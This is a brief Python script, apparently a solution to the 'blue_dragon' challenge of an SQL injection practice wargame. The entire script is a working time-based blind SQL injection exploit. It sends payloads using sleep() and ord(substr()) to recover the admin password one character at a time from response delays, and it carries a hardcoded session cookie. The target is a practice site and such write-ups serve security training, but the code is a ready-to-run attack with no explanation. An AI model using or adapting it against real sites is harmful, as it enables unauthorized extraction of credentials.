import requests
import time
pw = ''

for order in range(0,8):
    for p in range(48,124):
        start = time.time()
        url="https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php?pw='or id='admin' and if(ord(substr(pw,"+str(order+1)+",1))="+str(p)+",sleep(3), 0)%23"
        cookies={'PHPSESSID':'5sfp0t0s6s8fh4ve7d0i63u711'}
        res = requests.get(url,cookies= cookies)
        if time.time() - start > 3:
            pw = pw + chr(p)
            print(pw)
            break
